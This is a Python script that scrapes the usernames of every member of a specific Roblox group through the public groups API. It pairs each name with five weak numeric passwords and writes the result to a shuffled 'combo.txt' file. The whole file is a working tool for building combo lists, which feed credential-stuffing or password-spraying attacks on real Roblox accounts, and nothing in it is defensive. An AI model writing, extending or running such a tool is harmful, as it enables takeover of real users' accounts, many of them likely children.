import requests
import time
import random

groupId = 33106954
cursor = ''  # DONT CHANGE THIS
limit = 100
sortOrder = 'Desc'
counter = 0

passwords = [
    "12345678910",
    "1234567891",
    "1234567890",
    "999999999",
    "000000000"
]

file_path = "combo.txt"

user_req = requests.get(f"https://groups.roblox.com/v1/groups/{groupId}/users?limit={limit}&sortOrder={sortOrder}")
user_data = user_req.json()
cursor = user_data.get("nextPageCursor")

def chz(data):
    for user in data:
        username = user['user']['username']
        for password in passwords:
            file.write(f"{username}:{password}\n")
            print(f"{username}:{password}")

file = open(file_path, "a")

chz(user_data['data'])

while cursor:
    try:
        user_req = requests.get(f'https://groups.roblox.com/v1/groups/{groupId}/users?limit={limit}&cursor={cursor}&sortOrder={sortOrder}')
        user_data = user_req.json()
        cursor = user_data.get("nextPageCursor")
        
        chz(user_data['data'])
        
        counter += limit
        print(f"Progress: {counter}")
        
    except Exception as e:
        pass

file.close()

with open(file_path, "r") as f:
    lines = f.readlines()

random.shuffle(lines)

with open(file_path, "w") as f:
    f.writelines(lines)

input("Done")
